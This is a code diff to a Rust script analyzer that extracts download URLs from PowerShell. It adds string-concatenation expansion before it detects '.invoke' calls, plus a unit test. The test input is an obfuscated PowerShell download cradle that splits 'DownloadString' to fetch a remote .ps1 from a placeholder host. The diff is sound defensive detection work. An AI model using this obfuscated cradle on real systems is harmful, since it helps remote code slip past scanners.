@@ -9178,6 +9178,13 @@ fn is_utf16le(bytes: &[u8]) -> bool {
 }
 
 fn dynamic_download_invoke_downloads(text: &str) -> Vec<(String, Option<String>)> {
+    let expanded_text;
+    let text = if text.contains('+') && contains_ascii_case_insensitive_bytes(text, b".invoke") {
+        expanded_text = expand_double_string_concat(&expand_mixed_static_string_concat(text));
+        expanded_text.as_str()
+    } else {
+        text
+    };
     let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
         std::collections::HashMap::new();
     let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
@@ -12189,6 +12196,15 @@ mod dynamic_download_invoke_tests {
         );
 
         assert_eq!(urls, vec!["https://dyn-openread.example/a.bin"]);
+    }
+
+    #[test]
+    fn dynamic_concatenated_method_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('Download'+'String').Invoke('https://dyn-concat-method.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-concat-method.example/a.ps1"]);
     }
 }
 
